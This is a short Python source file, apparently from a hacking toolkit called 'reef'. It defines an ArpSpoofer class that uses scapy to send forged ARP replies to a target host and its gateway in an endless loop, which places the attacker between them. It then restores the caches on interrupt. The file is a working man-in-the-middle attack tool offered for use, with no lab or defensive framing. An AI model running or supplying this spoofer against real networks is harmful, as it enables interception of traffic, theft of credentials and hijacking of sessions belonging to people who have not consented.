import scapy.all as scapy
from reef.utils import get_gateway, get_mac
import time


class ArpSpoofer:
    """
    Class to provide an interface for the arpspoofer

    """

    def __init__(self, target, spoof_ip, g_mac):
        self.target = target
        self.spoof_ip = spoof_ip
        self.gateway = get_gateway()
        self.t_mac = get_mac(self.target)
        self.g_mac = g_mac

    def spoof(self, target, target_mac, spoof) -> None:
        pkt = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
        scapy.send(pkt, verbose=True)

    def restore(self, destination_ip, d_mac, source_ip, s_mac) -> None:
        destination_mac = d_mac
        source_mac = s_mac
        pkt = scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac,
        )

        scapy.send(pkt, verbose=False)

    def execute(self) -> None:
        try:
            spc = 0
            while True:
                self.spoof(self.target, self.t_mac, self.gateway)
                self.spoof(self.gateway, self.g_mac, self.target)
                spc += 2
                print(f"[*] Packets Sent {spc}")
                time.sleep(2)

        except KeyboardInterrupt:
            print("Restoring")
            self.restore(self.gateway, self.g_mac, self.target, self.t_mac)
            self.restore(self.target, self.t_mac, self.gateway, self.g_mac)
